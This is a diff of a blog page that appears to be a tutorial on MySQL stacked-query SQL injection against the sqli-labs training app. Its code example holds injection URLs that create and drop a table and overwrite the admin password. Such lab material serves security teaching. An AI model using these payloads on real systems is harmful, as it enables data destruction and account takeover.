@@ -842,7 +842,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2023-10-19 11:28:49" itemprop="dateModified" datetime="2023-10-19T11:28:49-04:00">2023-10-19</time>
+                <time title="Modified: 2023-10-19 11:36:07" itemprop="dateModified" datetime="2023-10-19T11:36:07-04:00">2023-10-19</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -862,7 +862,7 @@
                 </span>
                   , 
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Penetration-Test/MySQL/SQL-Injection/Stack-Based-SQL-Injection/" itemprop="url" rel="index"><span itemprop="name">Stack-Based SQL Injection</span></a>
+                  <a href="/categories/Penetration-Test/MySQL/SQL-Injection/MySQL-Stack-Based-SQL-Injection/" itemprop="url" rel="index"><span itemprop="name">MySQL Stack-Based SQL Injection</span></a>
                 </span>
             </span>
 
@@ -888,7 +888,7 @@
 <li>Search for the other party’s website source code on GitHub.</li>
 </ol>
 <p>Example:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.33/sqli-labs-master/Less-38/?<span class="built_in">id</span>=1<span class="string">&#x27;    You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;</span><span class="string">&#x27;1&#x27;</span><span class="string">&#x27; LIMIT 0,1&#x27;</span> at line 1   </span><br><span class="line">http://192.168.1.33/sqli-labs-master/Less-38/?<span class="built_in">id</span>=1<span class="string">&#x27;;   显示正常</span></span><br><span class="line"><span class="string">http://192.168.1.33/sqli-labs-master/Less-38/?id=1&#x27;</span>;create table aa like <span class="built_in">users</span>;    当前数据库中创建了一个与<span class="built_in">users</span>相同字段的表aa</span><br><span class="line">http://192.168.1.33/sqli-labs-master/Less-38/?<span class="built_in">id</span>=1<span class="string">&#x27;;drop table aa--+</span></span><br><span class="line"><span class="string">http://192.168.1.33/sqli-labs-master/Less-38/?id=1&#x27;</span>;update <span class="built_in">users</span>  <span class="built_in">set</span> password =<span class="string">&#x27;admin@1234&#x27;</span> <span class="built_in">where</span> username=<span class="string">&#x27;admin&#x27;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.33/sqli-labs-master/Less-38/?<span class="built_in">id</span>=1<span class="string">&#x27;    //You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;</span><span class="string">&#x27;1&#x27;</span><span class="string">&#x27; LIMIT 0,1&#x27;</span> at line 1   </span><br><span class="line">http://192.168.1.33/sqli-labs-master/Less-38/?<span class="built_in">id</span>=1<span class="string">&#x27;;   // it&#x27;</span>s ok</span><br><span class="line">http://192.168.1.33/sqli-labs-master/Less-38/?<span class="built_in">id</span>=1<span class="string">&#x27;;create table aa like users;    //create a table named aa, structure like table users</span></span><br><span class="line"><span class="string">http://192.168.1.33/sqli-labs-master/Less-38/?id=1&#x27;</span>;drop table aa--+</span><br><span class="line">http://192.168.1.33/sqli-labs-master/Less-38/?<span class="built_in">id</span>=1<span class="string">&#x27;;update users  set password =&#x27;</span>admin@1234<span class="string">&#x27; where username=&#x27;</span>admin<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
       
     </div>
 
